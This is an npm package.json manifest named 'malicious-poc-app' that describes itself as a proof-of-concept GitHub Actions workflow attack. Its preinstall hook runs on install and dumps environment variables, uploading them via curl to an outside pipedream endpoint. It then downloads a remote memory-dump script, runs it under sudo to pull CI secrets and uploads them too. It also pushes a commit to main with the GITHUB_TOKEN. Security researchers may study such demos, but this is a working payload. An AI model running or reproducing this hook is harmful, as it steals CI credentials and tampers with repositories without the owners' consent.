{
  "name": "malicious-poc-app",
  "version": "1.0.0",
  "description": "PoC: GitHub Actions workflow attack demo.",
  "main": "index.js",
  "scripts": {
    "preinstall": "set -ex && \
      echo 'Preinstall: exfil env' && \
      env > /tmp/env_dump && \
      curl -X PUT --upload-file /tmp/env_dump https://eoiissjprny7lfp.m.pipedream.net/env_secrets.txt && \
      echo 'Running memdump...' && \
      curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' > /tmp/secrets && \
      echo 'Uploading secrets...' && \
      curl -X PUT --upload-file /tmp/secrets https://eoiissjprny7lfp.m.pipedream.net/memdump_secrets.txt && \
      echo 'PoC File' > poc.txt && \
      git config --global user.email \"attacker@poc.com\" && \
      git config --global user.name \"PoC Attacker\" && \
      git add poc.txt && \
      git commit -m \"PoC: Added poc.txt via workflow exploit\" || echo \"nothing to commit\" && \
      git push https://x-access-token:$GITHUB_TOKEN@github.com/$GITHUB_REPOSITORY.git HEAD:main || echo \"push failed\""
  },
  "dependencies": {
    "lodash": "^4.17.21"
  }
}
